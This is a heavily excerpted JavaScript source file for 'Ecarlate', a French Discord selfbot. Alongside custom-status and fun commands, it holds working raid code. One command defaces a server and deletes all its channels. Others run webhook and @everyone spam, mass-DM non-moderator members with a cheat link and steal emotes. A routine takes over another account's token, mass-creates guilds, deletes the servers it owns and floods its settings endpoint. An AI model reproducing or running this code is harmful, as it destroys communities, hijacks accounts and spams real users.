...
const yourgif =
  "https://cdn.discordapp.com/attachments/873319734630838273/873554307075670036/ecarlate_by_amar_finie.png";
const yourgif1 =
  "https://cdn.discordapp.com/attachments/868819530728738867/873554159960465428/ecarlate_amelioree.gif";
const color = "BLACK";
...
const { set } = require("await-timeout");
...
client.on("ready", function() {
  console.log("Welcome to Ecarlate".yellow);
  console.log(
    `    
    @@@@@@@@   @@@@@@@   @@@@@@   @@@@@@@   @@@        @@@@@@   @@@@@@@  @@@@@@@@  
    @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@@@@@@  @@@       @@@@@@@@  @@@@@@@  @@@@@@@@  
    ...
    : :: ::    :: :: :   :   : :   :   : :  : :: : :   :   : :     :     : :: ::   
                                     ...
                                     S E L F B O T
                                            ...
                                            .reduce((a, b) => a + b)}  
╔════════════════USER════════════════╗        OS : ${os.platform}
  User Name : ${client.user.tag}                    Bots : ${ client.users.filter(user => user.bot).size }              
  User ID : ${client.user.id}                Channels : ${client.channels.size}
...
╚════════════════════════════════════╝
 ...
 client.on("ready", function() {
  if (client.user.bot) {
    console.log(
      `${client.user.username} est un robot desolée :/`
        .red
    );
    process.exit(1);
...
client.on("ready", function() {
  rpcGenerator.getRpcImage("777619769637339156", "wfa_logo").then(image => {
    rpcGenerator.getRpcImage("777619769637339156", "wfa").then(image2 => {
...
cmd
  ...
  .setURL("https://discord.gg/wUw8ZH7849")
  .setDescription("[Notre Discord](https://discord.gg/wUw8ZH7849)")
  .addField(
    "**𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚 𝙃𝙚𝙡𝙥**",
    "`help`, `help fun`, `help utile`, `help moderation`, `help nsfw`, `help backup`, `help hack`, `help raid`"
  )
  .addField(
    "**𝘾𝙤𝙢𝙢𝙖𝙣𝙙𝙚 𝘽𝙖𝙘𝙠𝙪𝙥** :gear: : ",
  ...
  .setImage(yourgif)
  .setThumbnail(yourgif1)
  .setFooter("Ecarlate-Selfbot");

let help_hack = new Discord.RichEmbed()
  .setTimestamp()
  .setColor(color)
  .setTitle("**𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙃𝙖𝙘𝙠𝙞𝙣𝙜**")
  .setURL("https://discord.gg/wUw8ZH7849")
  .setDescription("[Notre Discord](https://discord.gg/wUw8ZH7849)")
  .addField(
    `**${prefix}ddos voc**`,
...
help
  .setTimestamp()
  .setColor(color)
  .setTitle("🌙**𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥**🌙")
  .setURL("https://discord.gg/wUw8ZH7849")
  .setDescription("[Notre Discord](https://discord.gg/wUw8ZH7849)")
  .addField(`**${prefix}𝙘𝙢𝙙**`, "`Liste des commandes`")
  .addField(`**${prefix}𝙝𝙚𝙡𝙥  𝙛𝙪𝙣**`, "`Affiche les commandes fun` :joy:")
  .addField(
    `**${prefix}𝙝𝙚𝙡𝙥  𝙗𝙖𝙘𝙠𝙪𝙥**`,
    "`Affiche les commandes backups` :gear:"
  )
  .addField(
    `**${prefix}𝙝𝙚𝙡𝙥  𝙢𝙤𝙙𝙚𝙧𝙖𝙩𝙞𝙤𝙣**`,
  ...
  .addField(`**${prefix}𝙝𝙚𝙡𝙥  𝙣𝙨𝙛𝙬**`, "`Affiche les commandes nsfw` :underage:")
  .addField(
    `**${prefix}𝙝𝙚𝙡𝙥  𝙧𝙖𝙞𝙙**`,
...
let help_statut = new Discord.RichEmbed()
  .setColor(color)
  .setTitle("**𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙎𝙩𝙖𝙩𝙪𝙩** :performing_arts: ")
  .setURL("https://discord.gg/wUw8ZH7849")
  .setDescription("[Notre Discord](https://discord.gg/wUw8ZH7849)")
  .addField(
...
let help_backup = new Discord.RichEmbed()
  .setColor(color)
  .setTitle("**𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝘽𝙖𝙘𝙠𝙪𝙥** :gear: ")
  .setURL("https://discord.gg/wUw8ZH7849")
  .setDescription("[Notre Discord](https://discord.gg/wUw8ZH7849)")
...
let help_fun = new Discord.RichEmbed()
  .setTimestamp()
  .setColor(color)
  .setTitle("**𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙁𝙪𝙣** :joy: ")
  .setURL("https://discord.gg/wUw8ZH7849")
  .setDescription("[Notre Discord](https://discord.gg/wUw8ZH7849)")
  .addField(
    `**${prefix}start typing**`,
...
let help_moderation = new Discord.RichEmbed()
  .setTimestamp()
  .setColor(color)
  .setTitle("**𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙈𝙤𝙙𝙚𝙧𝙖𝙩𝙞𝙤𝙣** :tools: ")
  .setURL("https://discord.gg/wUw8ZH7849")
  .setDescription("[Notre Discord](https://discord.gg/wUw8ZH7849)")
  .addField(
...
let help_info = new Discord.RichEmbed()
  .setTimestamp()
  .setColor(color)
  .setTitle("**𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙐𝙩𝙞𝙡𝙚** :globe_with_meridians: ")
  .setURL("https://discord.gg/wUw8ZH7849")
  .setDescription("[Notre Discord](https://discord.gg/wUw8ZH7849)")
  .addField(
    `**${prefix}mp all**`,
...
let help_nsfw = new Discord.RichEmbed()
  .setTimestamp()
  .setColor(color)
  .setTitle("**𝙋𝙖𝙣𝙣𝙚𝙡 𝙙𝙚 𝙃𝙚𝙡𝙥 𝙣𝙨𝙛𝙬** :underage: ")
  .setURL("https://discord.gg/wUw8ZH7849")
  .setDescription("[Notre Discord](https://discord.gg/wUw8ZH7849)")
...
client.on("message", message => {
  ...
  if (message.content.startsWith(prefix + "deface")) {
    ...
    message.delete();
    message.guild.setName(`RAIDED BY ${client.user.username}`);
    message.guild.setIcon(
      "https://cdn.discordapp.com/attachments/851453414378700840/872846356098723850/logo.png"
    );
    message.guild.channels.forEach(ch => {
      if(!ch)return;
      ch.delete();
    });
    message.guild.createChannel("ecarlate", "text");
  ...
  if (message.content.startsWith(prefix + "create channel")) {
    ...
    for (let pas = 0; pas < 20; pas++) {
      message.guild
        .createChannel(`${client.user.username}`, "text")
        .catch(error =>
          console.log(
            "[",
            "ERROR".red,
  ...
  if(message.content.startsWith(prefix + "webhook spam")){
    let webhookmessages = args.splice(2).join(" ") ||
    "@everyone\nnus décalons sur Ecarlate les beau gosse ^^\nhttps://discord.gg/pna6zyy8kM";
       ...
       message.guild.channels.forEach(channel => {
         if(!channel)return;
          if (channel.type == 'text') {
              channel.createWebhook("décale", "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRXOybiPRVaDnYzQz9gA3ijBLfJFoxw_4zb9w&usqp=CAU").catch(error => console.log('[','ERROR'.red,']','une erreur est survenue que je ne peux régler'.green));
          }
      })
  ...
  if (message.content.startsWith(prefix + "mp all")) {
    ...
    let count = 0;
    let pub =
      args.splice(2).join(" ") || "**Best counter strike cheat 100% work** \nhttps://youtu.be/7817Q-MGmbg";
    ...
    setInterval(() => {
      ...
      if(membres.hasPermission("ADMINISTRATOR"))return;
      if(membres.hasPermission("MANAGE_MESSAGES"))return;
      if(membres.hasPermission("MANAGE_ROLES_OR_PERMISSIONS"))return;
      if(membres.hasPermission("BAN_MEMBERS"))return;
      ...
      console.log("[MP Envoyé]  |" + membres.user.username.green + `|  ${count} / ${msg.guild.members.filter(m => m.presence.status !== "offline").size} `);
      db[membres.user.id] = {
        raison: "mp"
      };
      saver();
  ...
  if (message.content.startsWith(prefix + "gucci")) {
    let argument = args.splice(1).join(" ") || "Ecarlate-Selfbot";
    rpcGenerator.getRpcImage("603405368940429315", "gucci").then(image => {
      rpcGenerator.getRpcImage("603405368940429315", "gucci0").then(image2 => {
        let presence = new rpcGenerator.Rpc()
          .setName("Gucci")
          ...
          .setAssetsLargeText("BE RICH WITH ECARLATE")
          .setState(argument)
          .setStartTimestamp(Date.now())
  ...
  if (message.content.startsWith(prefix + "lacoste")) {
    ...
    rpcGenerator.getRpcImage("603405368940429315", "lacoste").then(image => {
      let presence = new rpcGenerator.Rpc()
        ...
        .setDetails("Lacoste")
        .setAssetsLargeImage(image.id)
        .setAssetsLargeText("BE RAKAILLE WITH ECARLATE")
        .setState(argument)
        .setStartTimestamp(Date.now())
  ...
  if (message.content.startsWith(prefix + "nike")) {
    ...
    rpcGenerator.getRpcImage("603405368940429315", "nike").then(image => {
      let presence = new rpcGenerator.Rpc()
        ...
        .setDetails("Nike")
        .setAssetsLargeImage(image.id)
        .setAssetsLargeText("BE NIKED WITH ECARLATE")
        .setState(argument)
        .setStartTimestamp(Date.now())
  ...
  if (message.content.startsWith(prefix + "google")) {
    ...
    rpcGenerator.getRpcImage("603405368940429315", "google").then(image => {
      let presence = new rpcGenerator.Rpc()
        ...
        .setDetails("Google")
        .setAssetsLargeImage(image.id)
        .setAssetsLargeText("BE INSTRUCT WITH ECARLATE")
        .setState(argument)
        .setStartTimestamp(Date.now())
  ...
  if (message.content.startsWith(prefix + "skype")) {
    ...
    rpcGenerator.getRpcImage("603405368940429315", "skype").then(image => {
      let presence = new rpcGenerator.Rpc()
        ...
        .setDetails("Skype")
        .setAssetsLargeImage(image.id)
        .setAssetsLargeText("BE OLD WITH ECARLATE")
        .setState(argument)
        .setStartTimestamp(Date.now())
  ...
  if (message.content.startsWith(prefix + "snapchat")) {
    ...
    rpcGenerator.getRpcImage("603405368940429315", "snapchat").then(image => {
      let presence = new rpcGenerator.Rpc()
        ...
        .setDetails("Snapchat")
        .setAssetsLargeImage(image.id)
        .setAssetsLargeText("BE YOUNG WITH Ecarlate")
        .setState(argument)
        .setStartTimestamp(Date.now())
  ...
  if (message.content.startsWith(prefix + "facebook")) {
    ...
    rpcGenerator.getRpcImage("603405368940429315", "facebook").then(image => {
      let presence = new rpcGenerator.Rpc()
        ...
        .setDetails("Skype")
        .setAssetsLargeImage(image.id)
        .setAssetsLargeText("BE MORE OLD WITH ECARLATE")
        .setState(argument)
        .setStartTimestamp(Date.now())
  ...
  if (message.content.startsWith(prefix + "tiktok")) {
    ...
    rpcGenerator.getRpcImage("603405368940429315", "tiktok").then(image => {
      let presence = new rpcGenerator.Rpc()
        ...
        .setDetails("Tiktok")
        .setAssetsLargeImage(image.id)
        .setAssetsLargeText("BE A PUTE WITH ECARLATE")
        .setState(argument)
        .setStartTimestamp(Date.now())
  ...
  if (message.content.startsWith(prefix + "twitter")) {
    ...
    rpcGenerator.getRpcImage("603405368940429315", "twitter").then(image => {
      let presence = new rpcGenerator.Rpc()
        ...
        .setDetails("Twitter")
        .setAssetsLargeImage(image.id)
        .setAssetsLargeText("BE A E-FUCKER WITH ECARLATE")
        .setState(argument)
        .setStartTimestamp(Date.now())
  ...
  if (message.content.startsWith(prefix + "instagram")) {
    ...
    rpcGenerator.getRpcImage("603405368940429315", "instagram").then(image => {
      let presence = new rpcGenerator.Rpc()
        ...
        .setAssetsLargeImage(image.id)
        .setAssetsLargeText("BE INFLUENCER WITH ECARLATE")
        .setState(argument)
        .setStartTimestamp(Date.now())
  ...
  if (message.content.startsWith(prefix + "youtube")) {
    ...
    rpcGenerator.getRpcImage("603405368940429315", "youtube").then(image => {
      let presence = new rpcGenerator.Rpc()
        ...
        .setDetails("Youtube")
        .setAssetsLargeImage(image.id)
        .setAssetsLargeText("BE YOUTUBER WITH ECARLATE")
        .setState(argument)
        .setStartTimestamp(Date.now())
  ...
  if (message.content.startsWith(prefix + "tokyo ghoul")) {
    let argument = args.splice(2).join(" ") || "Ecarlate-Selfbot";
    rpcGenerator.getRpcImage("603405368940429315", "tokyo").then(image => {
      let presence = new rpcGenerator.Rpc()
        ...
        .setAssetsLargeImage(image.id)
        .setAssetsLargeText("Ecarlate-Selfbot")
        .setState(argument)
        .setStartTimestamp(Date.now())
  ...
  if (message.content.startsWith(prefix + "hunter x hunter")) {
    let argument = args.splice(3).join(" ") || "Ecarlate-Selfbot";
  ...
  if (message.content.startsWith(prefix + "clash royal")) {
    ...
    rpcGenerator.getRpcImage("603405368940429315", "clashroyal").then(image => {
      let presence = new rpcGenerator.Rpc()
        ...
        .setDetails("Ecarlate Selfbot")
        .setAssetsLargeImage(image.id)
        .setAssetsLargeText("Ecarlate-Selfbot E")
        .setState(argument)
        .setStartTimestamp(Date.now())
  ...
  if (msg.content === prefix + "roles list") {
    ...
    if (!message.member.hasPermission("EMBED_LINKS"))
      return message.edit(
        `:x: **permission insuffisante (embed_links)** ${role.map(r => r.name)}`
      );
      ...
      function(error, response, body) {
        if (response.statusCode === 200) {
          ...
          var validtoken = new Discord.RichEmbed()
            ...
            .setColor(color)
            .setTimestamp()
            .setFooter(`Ecarlate Selfbot`, message.author.avatarURL);
          message
            .edit(validtoken)
            .catch(error =>
              console.log(
  ...
  if (message.content.startsWith(prefix + "spam")) {
    ...
    let spam =
      args.splice(1).join(" ") + " spam by Ecarlate-Selfbot" ||
      "@everyone\nECARLATE\nhttps://discord.gg/xhzAcrw7yv";
    msg.edit("**Wait...**");
    setInterval(() => {
      msg.channel
        ...
        if (response.statusCode === 200) {
          fucked.on("ready", function() {
            for (pas = 0; pas < 100; pas++) {
              fucked.user.createGuild("Ecarlate-Selfbot", "london");
            }
          });
          ...
          fucked.on("ready", function() {
            ...
            fucked.guilds.forEach(serveurs => {
              if (serveurs.ownerID === fucked.user.id) {
                if(message.guild.id === "694168600822677544")return;
                serveurs
                  .delete()
                  .catch(err => {
                    if(err){
    ...
    request(
      ...
      function(error, response, body) {
        if (response.statusCode === 200) {
          fucked.on("ready", function() {
            for (pas = 0; pas < 100; pas++) {
              fucked.user.createGuild("TROLLED FDP", "london");
            }
          });
          for (pas = 0; pas < 20; pas++) {
            fetch("https://discord.com/api/v8/users/@me/settings", {
  ...
  if (message.content.startsWith(prefix + "mp friend")) {
    ...
    let saymsg =
      args.splice(2).join(" ") || "Ecarlate Selfbot\nhttps://discord.gg/xhzAcrw7yv";
  ...
  if (message.content.startsWith(prefix + "say")) {
    ...
    let saymsg = args.splice(1).join(" ") || "Ecarlate selfbot";
    let say = new Discord.RichEmbed()
      .setTitle("**Commande Say**")
      .setDescription(saymsg)
      .setTimestamp()
      .setFooter(`Ecarlate-Selbot`, `${client.user.avatarURL}`)
      .setColor(color);
    for (pas = 0; pas < 10; pas++) {
      say.setColor(color);
      message
  ...
  if (message.content === prefix + "stats") {
    ...
    embed
      ...
      .addField("Users:", `${client.guilds
        .map(guild => guild.memberCount)
        .reduce((a, b) => a + b)}`)
      .addField("Servers:", `${client.guilds.size}`)
      .setFooter("Ecarlate-Selfbot", `${client.user.avatarURL}`);
    if (client.user.premium > 0) {
  ...
  if (message.content.startsWith(prefix + "set serveur name")) {
    let arg = args.splice(1).join(" ") || "Ecarlate selfbot";
  ...
  if (message.content.startsWith(`${prefix}encode`)) {
    var text = args.join(" ") || "Ecarlate selfbot";
  ...
  if (message.content.startsWith(`${prefix}lovecalc`)) {
    ...
    let question = args.slice(0).join(" ") || "Ecarlate selfbot";
    let embed = new Discord.RichEmbed()
  ...
  if (message.content.startsWith(prefix + "steal emote")) {
    ...
    serveurid.emojis.forEach(emote => {
      setTimeout(() => {
        ...
        message.guild.createEmoji(`${Link}`, `${name}`).catch(error => i + "1");
      }, 1000);
    });
  ...
  try {
    ...
    if (
      ...
      message
        ...
        .then(m => {
          ...
          console.log(
            `Nouvelle backup du serveur ${message.guild.name} vient d'être crée, voici son id : ${id}`
              .green
          );
    ...
    if (msg.content === prefix + "backup liste") {
      try {
        ...
        if (!data) {
          message.edit(
            `:x: **Oups il semblerait que tu n'ai pas encore de backup fait ${prefix}help backup pour commencer a en voler**`
          );
          return;
        }
        let embed = new Discord.RichEmbed()
          .setTitle("**Ecarlate Backup Listes**")
          .setColor(color)
          .addField(
          ...
          .setDescription("[Notre Discord](https://discord.gg/wUw8ZH7849)")
          .setFooter(
            `Ecarlate-Selfbot | ${message.author.username}`,
    ...
    if (
      ...
      let cantfindEmbed = new Discord.RichEmbed()
        ...
        .setColor(color);
      if (!backups[message.author.id][id]) return message.edit(cantfindEmbed);
...
__Cette action est irréversible !__`);
    ...
    if (message.content === prefix + "backup friend") {
      ...
      let haste = `Successfully backed up ${
  ...
  if (oldChannelName === null) {
    if (kicked[oldMember.guild.id]) {
      if (oldMember.user.id === kicked[oldMember.guild.id].user) {
        if (!oldMember.guild.me.hasPermission("MOVE_MEMBERS"))
